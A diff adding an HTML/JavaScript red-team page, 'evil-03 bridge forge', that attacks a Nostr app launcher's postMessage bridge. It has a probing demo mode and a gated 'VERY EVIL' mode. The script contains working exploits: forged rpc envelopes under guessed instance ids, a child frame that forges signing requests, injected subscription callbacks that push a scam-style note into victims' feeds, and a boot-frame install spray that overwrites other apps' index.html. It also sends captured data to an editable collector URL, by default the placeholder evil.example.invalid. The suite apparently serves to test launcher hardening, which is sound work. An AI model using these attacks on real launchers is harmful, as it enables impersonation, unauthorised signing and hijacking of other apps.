@@ -1,0 +1,905 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>evil-03 bridge forge</title>
+<meta name="description" content="Red team: forged bridge envelopes — declared-instanceId routing, source-blind demux, bridge reply injection, boot-frame command forgery. Demo by default; VERY EVIL mode behind a typed gate.">
+<meta name="napp-id" content="evil-03-bridge-forge">
+<!--
+  evil-napps ROE (see repo README):
+  - demo mode: probe + masked evidence only. no writes outside this frame
+    (one immediately-cleaned marker key on the napp's OWN origin proves
+    the origin grant, nothing more), no network, no signing, no dispatch,
+    no store mutation, no persistence, no destruction.
+  - ONE navigation exception: the ancestor-navigation probe can only detect
+    permission by navigating, so it reloads the launcher at its OWN current
+    URL with a marker hash — reversible, nothing leaves the launcher's URL.
+  - VERY EVIL mode: in-napp arming + stern confirmation that describes
+    every armed payload exactly + typed EXECUTE EVIL, then real execution,
+    destructive payloads last.
+  - default collector is https://evil.example.invalid/collect (RFC 2606,
+    non-resolving): even in VERY EVIL mode nothing leaves the machine.
+-->
+<style>
+  :root {
+    --bg: #120f16;
+    --fg: #e9e6f2;
+    --primary: #ff5470;
+    --ok: #3fd68f;
+    --warn: #ffb454;
+    --muted: #8d88a3;
+    --danger: #ff5470;
+    --surface: color-mix(in srgb, var(--bg) 88%, var(--fg));
+    --border: color-mix(in srgb, var(--fg) 16%, transparent);
+    --space-1: 4px;
+    --space-2: 8px;
+    --space-3: 12px;
+    --control-h: 28px;
+    --radius: 6px;
+    color-scheme: dark;
+    font: 12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  html, body { height: 100%; margin: 0; }
+  #app {
+    container-type: inline-size;
+    height: 100%;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    gap: var(--space-2);
+    padding: var(--space-2);
+    background: var(--bg);
+    color: var(--fg);
+    user-select: none;
+  }
+  .toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: var(--space-1);
+    min-height: var(--control-h);
+    flex: 0 0 auto;
+  }
+  .summary {
+    color: var(--muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .summary b { color: var(--danger); }
+  .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
+  .spacer { flex: 1; }
+  button {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    cursor: pointer;
+    font: inherit;
+    height: var(--control-h);
+    padding: 0 10px;
+    white-space: nowrap;
+  }
+  button:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); }
+  button:disabled { opacity: .45; cursor: default; }
+  button.arm { border-color: color-mix(in srgb, var(--danger) 60%, var(--border)); color: var(--danger); font-weight: 700; }
+  #rows {
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-auto-rows: min-content;
+    gap: var(--space-1);
+    align-content: start;
+  }
+  @container (min-width: 760px) { #rows { grid-template-columns: 1fr 1fr; } }
+  @container (min-width: 1200px) { #rows { grid-template-columns: 1fr 1fr 1fr; } }
+  .attack {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    background: color-mix(in srgb, var(--surface) 30%, transparent);
+  }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
+  .attack-name { font-weight: 700; }
+  .attack-target { color: var(--muted); font-size: 11px; }
+  .chip {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 6px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .04em;
+    white-space: nowrap;
+  }
+  .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
+  .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.status-na { color: var(--muted); }
+  .chip.sev-critical { color: var(--danger); }
+  .chip.sev-high { color: var(--warn); }
+  .chip.sev-info { color: var(--muted); }
+  .evidence {
+    color: var(--muted);
+    font-size: 11px;
+    user-select: text;
+    overflow-wrap: anywhere;
+  }
+  .row-actions { display: flex; gap: var(--space-1); }
+  .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
+  #evilPanel {
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: var(--radius);
+    background: color-mix(in srgb, var(--danger) 8%, var(--surface));
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    max-height: 40%;
+    overflow: auto;
+    flex: 0 0 auto;
+  }
+  #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
+  .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
+  #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
+  #reportText {
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 90px;
+    resize: vertical;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    padding: var(--space-1);
+    user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
+  }
+  dialog {
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: 8px;
+    padding: var(--space-3);
+    max-width: min(640px, 92vw);
+    max-height: 86dvh;
+    overflow: auto;
+  }
+  dialog::backdrop { background: rgba(10, 6, 12, .8); }
+  dialog h2 { margin: 0 0 var(--space-2); color: var(--danger); font-size: 14px; text-transform: uppercase; letter-spacing: .08em; }
+  .stern { border: 1px solid var(--danger); border-radius: var(--radius); padding: var(--space-2); color: var(--danger); font-weight: 700; margin: 0 0 var(--space-2); }
+  .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
+  .plan-list li { margin-bottom: var(--space-2); }
+  .plan-list b { color: var(--danger); }
+  label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
+  input[type="text"], input[type="url"] {
+    box-sizing: border-box;
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: inherit;
+    padding: 4px 8px;
+  }
+  dialog .confirm-row { display: flex; gap: var(--space-1); align-items: center; margin-top: var(--space-2); flex-wrap: wrap; }
+  #confirmBtn { border-color: var(--danger); color: var(--danger); font-weight: 700; }
+  #confirmBtn:not(:disabled):hover { background: var(--danger); color: var(--bg); }
+  .muted { color: var(--muted); font-size: 11px; }
+  @media (max-height: 240px) { .toolbar button .btn-label-long { display: none; } #reportBox { display: none; } }
+  @container (max-width: 300px) { .attack-target { display: none; } }
+  #hijack {
+    display: none;
+    background: var(--danger);
+    color: #14060a;
+    font-weight: 700;
+    text-align: center;
+    padding: var(--space-2);
+    flex: 0 0 auto;
+  }
+  #hijack a { color: inherit; }
+</style>
+</head>
+<body>
+<div id="app">
+  <div id="hijack">⚠ THIS PAGE JUST NAVIGATED THE LAUNCHER (window.top) AWAY — you are looking at the evil napp, not the launcher. <a href="about:blank" onclick="history.length > 1 ? history.back() : null; return false">go back</a> if you can.</div>
+  <div class="toolbar">
+    <span id="summary" class="summary">probing…</span>
+    <span class="spacer"></span>
+    <button id="runAllBtn" type="button">run all</button>
+    <button id="reportBtn" type="button">report</button>
+    <button id="armBtn" class="arm" type="button">ARM VERY EVIL MODE</button>
+  </div>
+  <div id="rows"></div>
+  <div id="evilPanel" hidden>
+    <h2>VERY EVIL MODE — execution log</h2>
+    <div id="evilLog" class="evil-log"></div>
+  </div>
+  <div id="reportBox">
+    <details id="report">
+      <summary>report (JSON)</summary>
+      <textarea id="reportText" rows="6" spellcheck="false"></textarea>
+      <div class="row-actions" style="margin-top: 6px;">
+        <button id="copyReportBtn" type="button">copy report</button>
+      </div>
+    </details>
+  </div>
+</div>
+
+<dialog id="confirmDlg" aria-labelledby="confirmTitle">
+  <form method="dialog" style="display:grid; gap: 0;">
+    <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
+    <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened launcher will stop them.</p>
+    <ol id="planList" class="plan-list"></ol>
+    <label>collector / exfiltration destination (edit to point at your own)
+      <input id="collectorInput" type="url" spellcheck="false">
+    </label>
+    <label>type <b style="color: var(--danger);">EXECUTE EVIL</b> exactly, case-sensitive, to enable the button
+      <input id="confirmInput" type="text" autocomplete="off" spellcheck="false" placeholder="EXECUTE EVIL">
+    </label>
+    <div class="confirm-row">
+      <button id="confirmBtn" type="button" disabled>EXECUTE — DO EVIL</button>
+      <button value="cancel" type="submit" style="align-self: center;">cancel — stay demo</button>
+    </div>
+  </form>
+</dialog>
+
+<script>
+'use strict';
+(function () {
+  window.__EVIL_ID__ = 'evil-03-bridge-forge';
+  const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
+  const CONFIRM_PHRASE = 'EXECUTE EVIL';
+  const state = {
+    results: {},     // id -> { status, evidence }
+    evilResults: {}, // id -> object evidence of the real execution
+    veryEvil: false,
+    collector: DEFAULT_COLLECTOR,
+  };
+
+  const app = document.getElementById('app');
+  const rowsEl = document.getElementById('rows');
+  const summaryEl = document.getElementById('summary');
+  const evilPanel = document.getElementById('evilPanel');
+  const evilLog = document.getElementById('evilLog');
+  const armBtn = document.getElementById('armBtn');
+  const confirmDlg = document.getElementById('confirmDlg');
+  const confirmInput = document.getElementById('confirmInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const collectorInput = document.getElementById('collectorInput');
+  const planList = document.getElementById('planList');
+  const reportText = document.getElementById('reportText');
+
+  // If this page ever IS the top-level browsing context, the launcher was
+  // hijacked to it — show the banner (see the hijack row in evil-01).
+  if (window.top === window) document.getElementById('hijack').style.display = 'block';
+
+  /* ---------- shared helpers ---------- */
+
+  function errMsg(e) {
+    if (!e) return String(e);
+    if (typeof e === 'string') return e;
+    return (e.name ? e.name + ': ' : '') + (e.message || String(e));
+  }
+  function mask(v, keep) {
+    keep = keep || 6;
+    const s = String(v);
+    if (s.length <= keep) return s.slice(0, 1) + '…';
+    return s.slice(0, keep) + '… (' + s.length + ' chars, masked)';
+  }
+  function randId() {
+    try { return crypto.randomUUID().slice(0, 8); }
+    catch (_) { return Math.random().toString(16).slice(2, 10); }
+  }
+  function randHex(n) {
+    const b = new Uint8Array(n / 2);
+    crypto.getRandomValues(b);
+    return Array.from(b).map(x => x.toString(16).padStart(2, '0')).join('');
+  }
+  function withTimeout(promise, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const t = setTimeout(() => resolve('timeout'), ms);
+      Promise.resolve(promise).then(
+        (v) => { clearTimeout(t); resolve(v); },
+        (e) => { clearTimeout(t); resolve({ __rejected: errMsg(e) }); }
+      );
+    });
+  }
+  function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
+  function armed(evidence) { return { status: 'armed', evidence: evidence }; }
+  function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
+  function findNostr() {
+    if (window.nostr) return window.nostr;
+    try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
+    return null;
+  }
+  // NAPP context: instance id (window.name), the granted bridge surface,
+  // origin/position — captured once for every probe and the report.
+  function bridgePresence() {
+    return {
+      instance: safeGet(() => window.name) || null,
+      nostr: !!findNostr(),
+      nostrdb: typeof window.nostrdb === 'object',
+      napp: typeof window.napp === 'object',
+    };
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      parentLength: safeGet(() => window.parent.length),
+      bridge: bridgePresence(),
+      at: new Date().toISOString(),
+    });
+  }
+  async function sendToCollector(kind, data) {
+    const url = state.collector;
+    const body = JSON.stringify({ kind: kind, at: new Date().toISOString(), data: data });
+    try {
+      const r = await withTimeout(fetch(url, { method: 'POST', mode: 'no-cors', body: body }), 4000);
+      if (r === 'timeout') return 'fetch timed out';
+      if (r && r.__rejected) return 'network egress failed: ' + r.__rejected;
+      return 'request dispatched to collector (opaque response) — egress channel OPEN';
+    } catch (e) {
+      return 'network egress failed: ' + errMsg(e) + ' — launcher/CSP held';
+    }
+  }
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function postTop(msg) { window.top.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { cleanup(); resolve('timeout'); }, ms);
+    });
+  }
+  // A bridge rpc with the napp dialect this suite speaks (mirrors the
+  // reference bridge.js): a postMessage envelope tagged __nostrapps:"rpc".
+  // The wait outlasts a permission dialog's stale-dismiss (4s) so a denied
+  // reply is never mistaken for silence.
+  function bridgeRpc(method, params) {
+    const id = 'evil-rpc-' + randId();
+    const p = waitForMsg(id, 6500);
+    postParent({
+      __nostrapps: 'rpc', id: id, method: method,
+      params: params, instanceId: window.name,
+    });
+    return p;
+  }
+  // sessionStorage flag that survives a launcher reload at this origin —
+  // used by probes that must navigate to detect (see top-nav row).
+  const NAV_FLAG = '__evil01_navprobe__';
+  function navProbeFlag() { try { return sessionStorage.getItem(NAV_FLAG); } catch (_) { return null; } }
+  function setNavProbeFlag() { try { sessionStorage.setItem(NAV_FLAG, new Date().toISOString()); } catch (_) {} }
+  function clearNavProbeFlag() { try { sessionStorage.removeItem(NAV_FLAG); } catch (_) {} }
+
+  // evil-03 — bridge confusion (tier 1). The NAPP bridge is postMessage with
+// '*' targets; the only sender identity is MessageEvent.source and the
+// sender's origin — and neither the reference launcher's router nor the
+// reference bridge's reply paths actually check both. Validated from source
+// (eskema/nostrapps):
+//   - napp-window.ts messageHandler demuxes legacy envelopes by
+//     `event.origin === origin && data.instanceId === instanceId` —
+//     MessageEvent.source is NEVER checked: any frame at a napp's origin can
+//     impersonate any instance of that app, and a router that skips the
+//     origin check (declared-instanceId only) accepts any frame anywhere as
+//     any instance of any app.
+//   - bridge.js resolves rpc-result / napp-sub-callback by id/callbackId
+//     with NO source check: any frame that can reach a napp's Window can
+//     inject replies and feed events into its live subscriptions.
+//   - boot.html guards its install channel with `event.origin === LAUNCHER`
+//     — the one check this tier relies on; a launcher that skips it is one
+//     postMessage from a cross-app file swap.
+window.__EVIL_KIT__ = [
+  {
+    label: 'forged envelope — declared instanceId',
+    note: 'The bridge envelope carries instanceId as a plain field. A router that demuxes by declared fields (or origin+declared, for same-origin frames) executes the rpc bound to WHATEVER window the message claims — gated calls charge that window\'s nappId, replies go to its frame.',
+    data: { __nostrapps: 'rpc', id: 'rpcXXX', method: 'nostrdb.add', params: { event: '…' }, instanceId: '1 (the victim\'s — guessable: the reference mints sequential ids)' },
+  },
+  {
+    label: 'same-origin child frame — source-blind demux',
+    note: 'A srcdoc child of the napp inherits its origin AND its sandbox flags, and window.name is set by the parent. It posts an envelope with the napp\'s own declared instanceId; the reference router accepts it because origin+instanceId match — MessageEvent.source (the child) is never compared.',
+    data: { child: '<iframe name="<my instanceId>" srcdoc="…postMessage({instanceId: window.name})…">', routerAccepts: 'origin ✓ + declared instanceId ✓ — source unchecked' },
+  },
+  {
+    label: 'forged subscription callback — bridge reply injection',
+    note: 'bridge.js resolves napp-sub-callback by callbackId alone (sequential from 0). Any frame with a reference to the victim\'s Window (every sibling, via parent.frames) can inject eose/live events into its live feeds.',
+    data: { __nostrapps: 'napp-sub-callback', callbackId: 0, msg: { type: 'eose', events: ['ATTACKER_EVENT'] } },
+  },
+  {
+    label: 'boot-frame install forgery',
+    note: 'boot.html clears the origin\'s IDB and writes whatever files arrive in napp-install. With the sender check skipped, any napp can postMessage the VICTIM\'s boot frame (a sibling in the launcher\'s DOM) and swap its bytes; the victim\'s next reload runs attacker code at the victim\'s origin.',
+    data: { __nostrapps: 'napp-install', files: [{ path: '/index.html', body: 'ATTACKER HTML' }], policy: null },
+  },
+];
+
+// ── helpers ────────────────────────────────────────────────────────────────
+const FAKE_PK = '3d0e4f3a5c61787b90a1c2d3e4f5061728394a5b6c7d8e9fa0b1c2d3e4f50617';
+function mkEvent(content) {
+  return {
+    id: randHex(64),
+    pubkey: FAKE_PK,
+    created_at: Math.floor(Date.now() / 1000),
+    kind: 1,
+    tags: [['client', 'evil-napps']],
+    content,
+    sig: randHex(128),
+  };
+}
+function postFrame(win, msg) { try { win.postMessage(msg, '*'); } catch (_) {} }
+function eachSibling(fn) {
+  try {
+    for (let i = 0; i < window.parent.frames.length; i++) {
+      if (window.parent.frames[i] !== window) fn(window.parent.frames[i], i);
+    }
+  } catch (_) {}
+}
+async function storeHas(id) {
+  const r = await bridgeRpc('nostrdb.query', { filters: { ids: [id] } });
+  const evs = r && typeof r === 'object' ? (r.result || r.error || []) : [];
+  return Array.isArray(evs) && evs.some(e => e.id === id);
+}
+async function storeCleanup(id) {
+  try { await bridgeRpc('nostrdb.remove', { ids: [id] }); } catch (_) {}
+}
+function waitForVictimEcho(pred, ms) {
+  return new Promise((resolve) => {
+    const got = [];
+    const on = (e) => {
+      const d = e.data && e.data.__victimEcho;
+      if (d) got.push(d);
+      if (d && pred(d)) { cleanup(); resolve(d); }
+    };
+    function cleanup() { window.removeEventListener('message', on); }
+    window.addEventListener('message', on);
+    setTimeout(() => { cleanup(); resolve(null); }, ms || 3000);
+    window.__victimEchoes = got;
+  });
+}
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function findOwnBoot() {
+  let boot = null;
+  eachSibling((fr) => {
+    if (boot) return;
+    try { const d = fr.document; if (d && /napp boot/i.test(d.title || '')) boot = fr; } catch (_) {}
+  });
+  return boot;
+}
+
+const ATTACKS = [
+  {
+    id: 'cross-app-forge',
+    name: 'declared-instanceId forgery',
+    target: 'the router must bind identity to MessageEvent.source, never to envelope fields',
+    severity: 'critical',
+    harm: 'A router that demuxes by declared fields executes rpcs bound to whatever window the message CLAIMS: gated calls charge the victim app\'s approval record (its dialogs, its remembered decisions), replies route to its frame, and store mutations happen under its authority.',
+    evilBrief: 'Forges a gated napp.publish under the victim\'s instance identity — a real event published, charged to the victim\'s approval record, then reported.',
+    async demo() {
+      // ROE: one immediately-removed marker event proves the channel. The
+      // forge is posted from a CHILD frame (no window's source matches it),
+      // so the rpc only executes if the router trusts the DECLARED id.
+      const marker = mkEvent('__evil03_crossapp_marker__');
+      const guesses = ['1', '2', '3', '4', '5'].filter(x => x !== String(window.name || ''));
+      const child = document.createElement('iframe');
+      child.style.display = 'none';
+      const posts = guesses.map(g =>
+        '<' + 'script>window.top.postMessage(' + JSON.stringify({ __nostrapps: 'rpc', id: 'evil03-' + g + '-' + randId(), method: 'nostrdb.add', params: { event: marker }, instanceId: g }) + ', "*")<' + '/script>');
+      child.srcdoc = posts.join('');
+      document.documentElement.appendChild(child);
+      await sleep(1300);
+      const hit = await storeHas(marker.id);
+      await storeCleanup(marker.id);
+      try { child.remove(); } catch (_) {}
+      if (hit) {
+        return armed('a forged nostrdb.add EXECUTED under a DECLARED instanceId that is not mine (guessed: ' + guesses.join('/') + ', posted from a child frame no router knows) — the router trusts envelope fields over the sender. With a gated method the same forge charges the victim\'s approval record.');
+      }
+      return blocked('no forged-instance rpc executed — the router binds identity to the sender (source/origin checked)');
+    },
+    async evil() {
+      const ev = mkEvent('evil-03: published under the VICTIM\'s instance identity (forged rpc)');
+      const out = { forgedPublish: ev.id };
+      for (const g of ['1', '2', '3']) {
+        postTop({ __nostrapps: 'rpc', id: 'evil03p-' + randId(), method: 'napp.publish', params: { event: ev, relays: ['wss://attacker-relay.example'] }, instanceId: g });
+      }
+      await sleep(1500);
+      out.landed = await storeHas(ev.id);
+      return out;
+    },
+  },
+  {
+    id: 'source-blindness',
+    name: 'source-blind demux (same-origin child)',
+    target: 'the reference router checks origin + declared instanceId — never MessageEvent.source',
+    severity: 'critical',
+    harm: 'Any frame at the napp\'s origin can impersonate any instance of that app: a srcdoc child (or the origin\'s boot frames) posts envelopes with the napp\'s declared instanceId and the reference router accepts them. Instance A of an app can hijack instance B\'s dispatches, registrations and closes.',
+    evilBrief: 'A same-origin srcdoc child of this frame posts a gated signEvent rpc under MY declared instanceId — the signature it obtains is bound to my window by the launcher\'s own bookkeeping.',
+    async demo() {
+      const marker = mkEvent('__evil03_source_blind_marker__');
+      const envelope = {
+        __nostrapps: 'rpc',
+        id: 'evil03-child-' + randId(),
+        method: 'nostrdb.add',
+        params: { event: marker },
+        instanceId: String(window.name || ''),
+      };
+      const child = document.createElement('iframe');
+      child.style.display = 'none';
+      child.name = String(window.name || '');
+      child.srcdoc = '<script>window.top.postMessage(' + JSON.stringify(envelope) + ', "*")<\/script>' +
+        '<script>setTimeout(function(){window.top.postMessage(' + JSON.stringify(envelope) + ', "*")},400)<\/script>';
+      document.documentElement.appendChild(child);
+      await sleep(1300);
+      const hit = await storeHas(marker.id);
+      await storeCleanup(marker.id);
+      try { child.remove(); } catch (_) {}
+      if (hit) {
+        return armed('a CHILD FRAME\'s rpc (source ≠ my window, origin = my origin, declared instanceId = mine) was ACCEPTED — the router never compares MessageEvent.source. Every frame at my origin is every instance of my app.');
+      }
+      return blocked('the child frame\'s envelope was dropped — the router compares MessageEvent.source (spec-grade)');
+    },
+    async evil() {
+      const out = {};
+      const envelope = {
+        __nostrapps: 'rpc',
+        id: 'evil03-sign-' + randId(),
+        method: 'signEvent',
+        params: { kind: 1, tags: [['client', 'evil-napps']], content: 'evil-03: signed via a child frame\'s forged envelope', created_at: Math.floor(Date.now() / 1000) },
+        instanceId: String(window.name || ''),
+      };
+      const child = document.createElement('iframe');
+      child.style.display = 'none';
+      child.name = String(window.name || '');
+      child.srcdoc = '<script>' +
+        'window.addEventListener("message", function (e) { if (e.data && e.data.__evil03Sign) window.top.postMessage(e.data.__evil03Sign, "*"); });' +
+        '<\/script>';
+      document.documentElement.appendChild(child);
+      envelope.__evil03Sign = envelope; // the child relays it (the reply returns to MY frame; bridge drops it — effect is the point)
+      child.contentWindow.postMessage({ __evil03Sign: envelope }, '*');
+      await sleep(1500);
+      out.note = 'signEvent forged through a child frame under my declared instanceId (the signature, if granted, landed in the launcher store)';
+      out.storeEvidence = 'see the launcher store dump';
+      return out;
+    },
+  },
+  {
+    id: 'reply-injection',
+    name: 'bridge reply injection',
+    target: 'bridge.js resolves rpc-result / napp-sub-callback by id alone — no source check',
+    severity: 'high',
+    harm: 'Any frame that can reach a napp\'s Window (every sibling, via parent.frames) can inject bridge replies and subscription callbacks: resolve its pending rpcs with attacker data, and feed its live subscriptions arbitrary "relay" events. This is bridge-level, below every launcher router.',
+    evilBrief: 'Injects a forged eose callback carrying a crafted "note" into the victim\'s live feed — the victim renders attacker content as relay data.',
+    async demo() {
+      // ask every sibling to identify itself (the victim echoes for the red team)
+      eachSibling((fr) => postFrame(fr, { __victimEchoCheck: 1 }));
+      const heard = await waitForVictimEcho((m) => m.what === 'echo-check', 2500);
+      if (!heard) return na('no victim frame answered the echo-check — open the victim napp to probe this row');
+      const marker = mkEvent('__evil03_reply_injection__');
+      eachSibling((fr) => {
+        for (const cbId of [0, 1, 2]) {
+          postFrame(fr, { __nostrapps: 'napp-sub-callback', callbackId: cbId, msg: { type: 'eose', events: [marker] } });
+        }
+      });
+      const hit = await waitForVictimEcho(
+        (m) => m.what === 'feed-eose' && JSON.stringify(m.result || []).indexOf('__evil03_reply_injection__') !== -1,
+        3000);
+      if (hit) {
+        return armed('the victim\'s bridge accepted my forged subscription callback (callbackId guessed from the bridge\'s sequential counter): its live feed delivered MY event and echoed it back. Any app\'s pending rpcs and feeds are injectable by any sibling.');
+      }
+      return blocked('no forged callback landed — the victim\'s bridge checks message sources');
+    },
+    async evil() {
+      const forged = mkEvent('DISCOUNT ZAPS TODAY — click nevent1evil to claim (forged by evil-03, delivered through the victim\'s own live feed)');
+      eachSibling((fr) => {
+        for (const cbId of [0, 1, 2]) {
+          postFrame(fr, { __nostrapps: 'napp-sub-callback', callbackId: cbId, msg: { type: 'eose', events: [forged] } });
+        }
+      });
+      await sleep(800);
+      const hit = await waitForVictimEcho(
+        (m) => m.what === 'feed-eose' && JSON.stringify(m.result || []).indexOf('evil-03') !== -1,
+        3000);
+      return { injected: !!hit, content: forged.content.slice(0, 80) };
+    },
+  },
+  {
+    id: 'boot-command-forgery',
+    name: 'boot-frame command forgery',
+    target: 'boot.html\'s install channel must accept the launcher origin only',
+    severity: 'critical',
+    destructive: true,
+    harm: 'The boot frame at each napp\'s origin can clear the origin\'s IndexedDB and write whatever files arrive in napp-install. If it accepts a non-launcher sender, any napp can swap ANY napp\'s bytes: the victim\'s next reload runs attacker code at the victim\'s origin, behind the victim\'s window title.',
+    evilBrief: 'Sprays napp-install (a loud takeover page as /index.html) to EVERY boot frame in the launcher DOM, then reads the files back per origin to prove the swap. The victim\'s next reload runs my bytes. DESTRUCTIVE (persisted): runs LAST.',
+    async demo() {
+      const boot = findOwnBoot();
+      if (!boot) return na('no same-origin boot frame found (at-launcher mode boots none) — the channel exists only in the SW pipeline');
+      const got = await new Promise((resolve) => {
+        const on = (e) => {
+          const d = e.data;
+          if (d && d.__nostrapps === 'napp-read-files-done') { cleanup(); resolve(d); }
+        };
+        function cleanup() { window.removeEventListener('message', on); }
+        window.addEventListener('message', on);
+        postFrame(boot, { __nostrapps: 'napp-read-files' });
+        setTimeout(() => { cleanup(); resolve(null); }, 2500);
+      });
+      if (got) {
+        const paths = (got.files || []).map(f => f.path).join(', ');
+        return armed('the boot frame answered MY napp-read-files (paths: ' + mask(paths, 40) + ') — the install channel accepts non-launcher senders: any napp here can swap files or wipe any origin');
+      }
+      return blocked('the boot frame ignored my command — sender-checked (launcher origin only)');
+    },
+    async evil() {
+      // NOTE: the takeover bytes (and this comment) deliberately avoid the
+      // literal closing-html sequence — the reference sw.js injects the
+      // ready tag before the FIRST such sequence in the document (string
+      // surgery), so a napp whose bytes carry it splits its own main script
+      // mid-parse (validated from source and reproduced; see ROADMAP evil-03).
+      // All occurrences below are backslash-escaped.
+      const takeover = '<!doctype html><html><head><meta charset="utf-8"><title>Victim Notes</title></head><body style="margin:0;background:#2a0505;color:#ff5470;font:13px ui-monospace,monospace;padding:10px">' +
+        '<h1 style="font-size:14px">⚠ evil-03 WAS HERE</h1><p>This page replaced the victim napp\'s /index.html through its boot frame. Same window title, same origin, attacker bytes.</p>' +
+        '<\/body><\/html>';
+      const files = [
+        { path: '/index.html', body: takeover, mime: 'text/html' },
+        { path: '/metadata.json', body: JSON.stringify({ id: 'victim', title: 'Victim Notes', description: '(bytes swapped by evil-03)' }), mime: 'application/json' },
+      ];
+      const replies = [];
+      const on = (e) => {
+        const d = e.data;
+        if (d && (d.__nostrapps === 'napp-install-done' || d.__nostrapps === 'napp-read-files-done')) replies.push(d.__nostrapps);
+        if (d && d.__nostrapps === 'napp-read-files-done') window.__evil03Files = d.files;
+      };
+      window.addEventListener('message', on);
+      // the install rewrites the origin's policy record — keep the boot
+      // channel open behind us (a launcher re-stamps policy after install;
+      // an attacker just keeps what they came through)
+      eachSibling((fr) => postFrame(fr, { __nostrapps: 'napp-install', files, policy: { domains: ['identity', 'network'], v: 2, bootOpen: true } }));
+      await sleep(1500);
+      const installs = replies.filter(r => r === 'napp-install-done').length;
+      eachSibling((fr) => postFrame(fr, { __nostrapps: 'napp-read-files' }));
+      await sleep(1500);
+      window.removeEventListener('message', on);
+      const swapped = (window.__evil03Files || []).some(f => f.path === '/index.html' && String(f.body).includes('evil-03 WAS HERE'));
+      return { installAcks: installs, readbackProvesSwap: swapped, note: 'the victim\'s next reload runs my bytes at its origin' };
+    },
+  },
+];
+
+
+  /* ---------- rendering ---------- */
+
+  function sevChip(sev) {
+    const s = sev === 'critical' ? 'sev-critical' : sev === 'high' ? 'sev-high' : 'sev-info';
+    return '<span class="chip ' + s + '">' + sev + '</span>';
+  }
+  function statusChip(st) {
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'na' ? 'N/A' : st || '—';
